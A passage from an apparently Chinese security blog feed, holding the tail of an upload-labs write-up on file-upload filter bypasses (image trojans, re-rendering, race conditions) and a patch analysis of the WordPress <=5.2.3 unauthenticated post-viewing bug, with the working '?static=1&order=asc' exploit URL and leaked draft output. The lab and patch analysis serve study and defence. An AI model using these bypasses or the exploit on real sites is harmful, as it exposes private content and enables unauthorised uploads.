href="#13-16、（图片马绕过）（getimagesize图片类型绕过）（php-exif模块图片类型绕过）（二次渲染绕过）" class="headerlink" title="13-16、（图片马绕过）（getimagesize图片类型绕过）（php_exif模块图片类型绕过）（二次渲染绕过）"></a>13-16、（图片马绕过）（getimagesize图片类型绕过）（php_exif模块图片类型绕过）（二次渲染绕过）</h2><h3 id="getimagesize图片类型绕过："><a href="#getimagesize图片类型绕过：" class="headerlink" title="getimagesize图片类型绕过："></a>getimagesize图片类型绕过：</h3><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><p>所以用cmd命令来做图片马</p><h3 id="hp-exif模块图片类型绕过："><a href="#hp-exif模块图片类型绕过：" class="headerlink" title="hp_exif模块图片类型绕过："></a>hp_exif模块图片类型绕过：</h3><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p>和上关一样的图片马即可</p><h3 id="二次渲染绕过："><a href="#二次渲染绕过：" class="headerlink" title="二次渲染绕过："></a>二次渲染绕过：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到使用上关一样的图片马即可</p><h2 id="17、18、条件竞争绕过"><a href="#17、18、条件竞争绕过" class="headerlink" title="17、18、条件竞争绕过"></a>17、18、条件竞争绕过</h2><p>定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p><p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。</p><p>某人的理解：两只哈士奇（线程）同时去抢一个丢出去的飞盘（资源），不知道到底哪只能抢到，此处便形成了竞争。</p><p>方法：</p><p>只要<strong>手速够快</strong>，就能成功</p><p>在burp中一直跑就行</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload06.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload05.png" alt="躲起来了"></p><p>19、move_uploaded_file()截断</p><p>move_uploaded_file() ：函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload07.png" alt="躲起来了"></p><p>方法：</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload08.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload09.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload10.png" alt="躲起来了"></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress &lt;=5.2.3：如何查看未授权文章</title>
      <link href="/2019/10/22/WordPress%20=5.2.3/"/>
      <url>/2019/10/22/WordPress%20=5.2.3/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>几天之前，WordPress发布了<a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/" target="_blank" rel="noopener">5.2.4</a>版本，其中包含一些安全更新，修复了查看未授权文章（post）的漏洞，该漏洞最早由J.D. Grimes发现并公布。我对该漏洞比较感兴趣，但并没有找到公开的PoC，因此我决定逆向分析一下已公开的补丁。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>由于我找不到任何PoC，因此首先我想尽可能多地收集与该漏洞相关的信息。我对比了来自不同安全厂商的声明，大部分厂商都引用了相同的一句话：“可能（利用该漏洞）查看未授权文章”，如下所示：</p><ul><li><a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html" target="_blank" rel="noopener">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a></li><li><a href="https://blog.wpsec.com/wordpress-5-2-4-security-release/" target="_blank" rel="noopener">https://blog.wpsec.com/wordpress-5-2-4-security-release/</a></li><li><a href="https://www.reddit.com/r/netsec/comments/di9kf2/wordpress_524_security_release_breakdown/f3vbuyh/" target="_blank" rel="noopener">https://www.reddit.com/r/netsec/comments/di9kf2/wordpress_524_security_release_breakdown/f3vbuyh/</a></li><li>…</li></ul><p>根据这些信息，我在WordPress SVN仓库/<a href="https://github.com/WordPress/WordPress" target="_blank" rel="noopener">Github镜像仓库</a>中，选择<code>5.2-branch</code>分支，然后分析最近的<a href="https://github.com/WordPress/WordPress/commits/5.2-branch" target="_blank" rel="noopener">commits</a>，查找提到了<code>unauthenticated posts</code>或者<code>viewing posts</code>的相关commit。根据这种方式，我找到了<a href="https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308" target="_blank" rel="noopener">Commit f82ed753cf00329a5e41f2cb6dc521085136f308</a>。</p><h2 id="0x02-分析补丁"><a href="#0x02-分析补丁" class="headerlink" title="0x02 分析补丁"></a>0x02 分析补丁</h2><p>这个commit只修改了两行代码，移除了<code>static</code>关键词，修改了部分<code>if</code>条件语句。</p><p><a href="https://p2.ssl.qhimg.com/t01f796773e23df7e4d.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>根据我的猜想，被删除的<code>static</code>检查在这个绕过漏洞中扮演关键角色。<code>wp-includes/class-wp-query.php</code>在第731行代码开始涉及到<code>parse_query</code>函数，该函数可以过滤并解析传入的所有查询参数（<code>$_GET</code>）。</p><p>从第696行到第922行，我们可以看到长达125行的条件代码块，代码会根据给定的参数来设置<code>$this-&gt;is_single</code>、<code>$this-&gt;is_attachment</code>或者<code>$this-&gt;is_page</code>。这些条件分支都基于<code>elseif</code>，只有一个分支值得研究，如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// If year, month, day, hour, minute, and second are set, a single</span></span><br><span class="line">    <span class="comment">// post is being queried.</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="string">''</span> != $qv[<span class="string">'static'</span>] || <span class="string">''</span> != $qv[<span class="string">'pagename'</span>] || ! <span class="keyword">empty</span>( $qv[<span class="string">'page_id'</span>] ) ) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;is_page   = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;is_single = <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Look for archive queries. Dates, categories, authors, search, post type archives.</span></span><br></pre></td></tr></table></figure><p>因此，我们肯定不希望设置像<code>attachment</code>、<code>name</code>、<code>p</code>或者<code>hour</code>之类的参数，这些参数可以跳过代码分支。我们不能设置<code>pagename</code>或者<code>page_id</code>，因为我们不知道这些参数值，并且（或者）这些参数只会返回一个结果，导致访问控制检查失效。</p><p>相反，我们需要在参数列表中使用<code>static=1</code>。这里我花了数个小时来理解并熟悉WordPress代码及相关函数功能。</p><p>最终我找到了<code>get_posts()</code>函数，该函数可以使用（已解析的）参数来查询数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_posts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $wpdb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;parse_query();</span><br><span class="line">    [..]</span><br></pre></td></tr></table></figure><p>在多个位置使用<code>var_dump</code>调试技术后，我最终找到了如下代码段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check post status to determine if post should be displayed.</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( <span class="keyword">$this</span>-&gt;posts ) &amp;&amp; ( <span class="keyword">$this</span>-&gt;is_single || <span class="keyword">$this</span>-&gt;is_page ) ) &#123;</span><br><span class="line">    $status = get_post_status( <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>] );</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">'attachment'</span> === <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>]-&gt;post_type &amp;&amp; <span class="number">0</span> === (int) <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>]-&gt;post_parent ) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;is_page       = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;is_single     = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;is_attachment = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $post_status_obj = get_post_status_object( $status );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//PoC: Let's see what we have</span></span><br><span class="line">    <span class="comment">//var_dump($q_status);</span></span><br><span class="line">    <span class="comment">//var_dump($post_status_obj);</span></span><br><span class="line">    <span class="comment">// If the post_status was specifically requested, let it pass through.</span></span><br><span class="line">    <span class="keyword">if</span> ( ! $post_status_obj-&gt;public &amp;&amp; ! in_array( $status, $q_status ) ) &#123;</span><br><span class="line">        <span class="comment">//var_dump("PoC: Incorrect status! :-/");</span></span><br><span class="line">        <span class="keyword">if</span> ( ! is_user_logged_in() ) &#123;</span><br><span class="line">            <span class="comment">// User must be logged in to view unpublished posts.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;posts = <span class="keyword">array</span>();</span><br><span class="line">            <span class="comment">//var_dump("PoC: No posts :-(");</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ( $post_status_obj-&gt;protected ) &#123;</span><br><span class="line">                <span class="comment">// User must have edit permissions on the draft to preview.</span></span><br><span class="line">                <span class="keyword">if</span> ( ! current_user_can( $edit_cap, <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>]-&gt;ID ) ) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;posts = <span class="keyword">array</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;is_preview = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( <span class="string">'future'</span> != $status ) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>]-&gt;post_date = current_time( <span class="string">'mysql'</span> );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $post_status_obj-&gt;private ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( ! current_user_can( $read_cap, <span class="keyword">$this</span>-&gt;posts[<span class="number">0</span>]-&gt;ID ) ) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;posts = <span class="keyword">array</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;posts = <span class="keyword">array</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于除了<code>static=1</code>之外，我们并没有设置任何特定的查询参数，因此在<code>$this-&gt;posts = $wpdb-&gt;get_results($this-&gt;request);</code>之前的SQL查询语句为<code>var_dump($this-&gt;request);</code>，具体如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(112) "<span class="keyword">SELECT</span>   wp_posts.* <span class="keyword">FROM</span> wp_posts  <span class="keyword">WHERE</span> <span class="number">1</span>=<span class="number">1</span>  <span class="keyword">AND</span> wp_posts.post_type = <span class="string">'page'</span>  <span class="keyword">ORDER</span> <span class="keyword">BY</span> wp_posts.post_date <span class="keyword">DESC</span> <span class="string">"</span></span><br></pre></td></tr></table></figure><p>该语句可以返回数据库中的所有页面（包括<code>password protected</code>、<code>pending</code>及<code>drafts</code>类别的页面）。因此，<code>! empty( $this-&gt;posts ) &amp;&amp; ( $this-&gt;is_single || $this-&gt;is_page )</code>对应的值为<code>true</code>。</p><p>该函数随后会检查<strong>第一</strong>篇文章的状态（<code>$status = get_post_status( $this-&gt;posts[0] );</code>）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ! $post_status_obj-&gt;public &amp;&amp; ! in_array( $status, $q_status ) ) &#123;</span><br></pre></td></tr></table></figure><p>如果第一篇文章的状态不是<code>public</code>，则将进一步执行访问控制检查。比如，当用户未经授权时，代码将会清空<code>$this-&gt;posts</code>。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>因此，利用方式也非常直接：我们可以控制查询流程，使第一篇文章的状态为<code>published</code>，但返回数组中包含多篇文章。</p><p>为了演示这个过程，我们需要创建一些页面：</p><ul><li>一个处于已发布状态的页面</li><li>一个处于草稿状态的页面</li></ul><p>这里我使用的是页面，因为<code>post_type=&#39;page&#39;</code>是WordPress的默认设置，但如果有需要，我们可以设置<code>&amp;post_type=post</code>，这样就能修改文章类型，变成<code>post_type = &#39;post&#39;</code>。</p><p><a href="https://p4.ssl.qhimg.com/t01471f56beb48bc6ab.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>目前我们知道如果在WordPress的URL添加<code>?static=1</code>，应该能查看网站的隐私内容。在访问控制检查之前添加<code>var_dump($this-&gt;posts);</code>，我们可以看到<code>http://wordpress.local/?static=1</code>这个URL会返回如下页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  object(WP_Post)<span class="comment">#763 (24) &#123;</span></span><br><span class="line">    [<span class="string">"ID"</span>]=&gt;</span><br><span class="line">    int(<span class="number">43</span>)</span><br><span class="line">    [<span class="string">"post_author"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">    [<span class="string">"post_date"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:55:29"</span></span><br><span class="line">    [<span class="string">"post_date_gmt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"0000-00-00 00:00:00"</span></span><br><span class="line">    [<span class="string">"post_content"</span>]=&gt;</span><br><span class="line">    string(<span class="number">79</span>) <span class="string">"&lt;!-- wp:paragraph --&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;A draft with secret content&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /wp:paragraph --&gt;"</span></span><br><span class="line">    [<span class="string">"post_title"</span>]=&gt;</span><br><span class="line">    string(<span class="number">7</span>) <span class="string">"A draft"</span></span><br><span class="line">    [<span class="string">"post_excerpt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">5</span>) <span class="string">"draft"</span></span><br><span class="line">    [<span class="string">"comment_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">6</span>) <span class="string">"closed"</span></span><br><span class="line">    [<span class="string">"ping_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">6</span>) <span class="string">"closed"</span></span><br><span class="line">    [<span class="string">"post_password"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_name"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"to_ping"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"pinged"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_modified"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:55:29"</span></span><br><span class="line">    [<span class="string">"post_modified_gmt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:55:29"</span></span><br><span class="line">    [<span class="string">"post_content_filtered"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_parent"</span>]=&gt;</span><br><span class="line">    int(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">"guid"</span>]=&gt;</span><br><span class="line">    string(<span class="number">34</span>) <span class="string">"http://wordpress.local/?page_id=43"</span></span><br><span class="line">    [<span class="string">"menu_order"</span>]=&gt;</span><br><span class="line">    int(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">"post_type"</span>]=&gt;</span><br><span class="line">    string(<span class="number">4</span>) <span class="string">"page"</span></span><br><span class="line">    [<span class="string">"post_mime_type"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"comment_count"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"0"</span></span><br><span class="line">    [<span class="string">"filter"</span>]=&gt;</span><br><span class="line">    string(<span class="number">3</span>) <span class="string">"raw"</span></span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  object(WP_Post)<span class="comment">#764 (24) &#123;</span></span><br><span class="line">    [<span class="string">"ID"</span>]=&gt;</span><br><span class="line">    int(<span class="number">41</span>)</span><br><span class="line">    [<span class="string">"post_author"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">    [<span class="string">"post_date"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:54:50"</span></span><br><span class="line">    [<span class="string">"post_date_gmt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:54:50"</span></span><br><span class="line">    [<span class="string">"post_content"</span>]=&gt;</span><br><span class="line">    string(<span class="number">66</span>) <span class="string">"&lt;!-- wp:paragraph --&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Public content&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /wp:paragraph --&gt;"</span></span><br><span class="line">    [<span class="string">"post_title"</span>]=&gt;</span><br><span class="line">    string(<span class="number">13</span>) <span class="string">"A public page"</span></span><br><span class="line">    [<span class="string">"post_excerpt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">7</span>) <span class="string">"publish"</span></span><br><span class="line">    [<span class="string">"comment_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">6</span>) <span class="string">"closed"</span></span><br><span class="line">    [<span class="string">"ping_status"</span>]=&gt;</span><br><span class="line">    string(<span class="number">6</span>) <span class="string">"closed"</span></span><br><span class="line">    [<span class="string">"post_password"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_name"</span>]=&gt;</span><br><span class="line">    string(<span class="number">13</span>) <span class="string">"a-public-page"</span></span><br><span class="line">    [<span class="string">"to_ping"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"pinged"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_modified"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:55:10"</span></span><br><span class="line">    [<span class="string">"post_modified_gmt"</span>]=&gt;</span><br><span class="line">    string(<span class="number">19</span>) <span class="string">"2019-10-20 03:55:10"</span></span><br><span class="line">    [<span class="string">"post_content_filtered"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"post_parent"</span>]=&gt;</span><br><span class="line">    int(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">"guid"</span>]=&gt;</span><br><span class="line">    string(<span class="number">34</span>) <span class="string">"http://wordpress.local/?page_id=41"</span></span><br><span class="line">    [<span class="string">"menu_order"</span>]=&gt;</span><br><span class="line">    int(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">"post_type"</span>]=&gt;</span><br><span class="line">    string(<span class="number">4</span>) <span class="string">"page"</span></span><br><span class="line">    [<span class="string">"post_mime_type"</span>]=&gt;</span><br><span class="line">    string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">    [<span class="string">"comment_count"</span>]=&gt;</span><br><span class="line">    string(<span class="number">1</span>) <span class="string">"0"</span></span><br><span class="line">    [<span class="string">"filter"</span>]=&gt;</span><br><span class="line">    string(<span class="number">3</span>) <span class="string">"raw"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上所示，数组中的第一个页面为草稿页面（<code>[&quot;post_status&quot;]=&gt;string(5) &quot;draft&quot;</code>），因此我们看不到任何内容：</p><p><a href="https://p4.ssl.qhimg.com/t01b558e667513e27bb.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>然而，我们可以使用一些方法来控制返回的内容：</p><ul><li>使用<code>asc</code>或者<code>desc</code>执行<code>order</code>排序</li><li><code>orderby</code></li><li>使用<code>m=YYYY</code>、<code>m=YYYYMM</code>或者<code>m=YYYYMMDD</code>日期格式的<code>m</code></li><li>…</li></ul><p>在这种测试场景中，我们只要简单颠倒返回的元素顺序即可，此时访问<code>http://wordpress.local/?static=1&amp;order=asc</code>，我们就可以查看到隐私内容：</p><p><a href="https://p1.ssl.qhimg.com/t017f276616ceeec808.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>我们也可以利用该漏洞查看<code>password protected</code>以及<code>private</code>状态的文章：</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证、伪造 一</title>
      <link href="/2019/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%B8%80/"/>
      <url>/2019/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%E4%B8%80/</url>
      
